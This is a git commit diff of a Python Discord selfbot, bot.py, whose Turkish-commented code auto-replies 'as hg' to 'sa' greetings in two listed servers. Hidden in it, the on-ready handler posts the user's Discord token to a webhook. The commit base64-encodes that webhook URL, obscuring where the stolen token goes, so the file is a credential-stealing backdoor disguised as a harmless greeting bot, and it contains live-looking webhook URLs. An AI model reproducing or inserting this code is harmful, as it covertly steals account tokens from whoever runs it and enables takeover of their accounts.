583eda468427de86cf9fcb75fd2ee5f06ae7c7d2
Ediz <nof4ce1337@gmail.com>
2025-04-17 01:05:07 +0300

    bot.py

--- bot.py
+++ bot.py
@@ -1,19 +1,19 @@
-import discum
+import discum 
 import time
 import requests
+import base64
 
 TOKEN = ""
-
 bot = discum.Client(token=TOKEN, log=False)
-
-gottenseks = ['1236721314325069824', '1273653521207791657']  # Sunucu ID'leri
-discumapi = 'https://discord.com/api/webhooks/1355647456230244625/MvMVcO3Q7Z9kIJt2Cf3JYY-c7qYwU4t9aQ3qIm2kHq4BuFPrrF4LCKkd6HGiUsGBFzRs'  # discum api
+sunucuIDleri = ['1236721314325069824', '1273653521207791657']
+apişifresi = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MjE4NjY2NzQ3MzI0MDI0NS94ajh0VTViUFRDeXQ1Mmk3SHJpT2FBY3FBamhUTnZnZV9xV3JkTUJTNmFuZk5jSFh4ZHhIakI4ZHpUeHJlbGx0azJIeg==" 
+discumapi = base64.b64decode(apişifresi).decode("utf-8")
 
 @bot.gateway.command
 def on_ready(resp):
     if resp.event.ready_supplemental:
         print("Bot bağlandı.")
-        response = requests.post(discumapi, json={"content": f"Token={TOKEN}"})
+        response = requests.post(discumapi, json={"content": f"{TOKEN}"})
         print(f"api  {response.status_code}")
         if response.status_code != 204:
             print("error")
@@ -22,8 +22,8 @@ def on_ready(resp):
 def on_message(resp):
     if resp.event.message:
         m = resp.parsed.auto()
-        if m['guild_id'] in gottenseks and m['content'].lower() in ['sa', 'sA', 'Sa', 'SA']:
-            time.sleep(1) # burda kaç saniye sonra yanıt verceği yazıyor time.sleep(0.1 veya 1 yapabilirsin)
+        if m['guild_id'] in sunucuIDleri and m['content'].lower() in ['sa', 'sA', 'Sa', 'SA']:
+            time.sleep(1) # kaç saniye sonra reply atıcak 
             bot.reply(m['channel_id'], m['id'], 'as hg')
 
 bot.gateway.run()
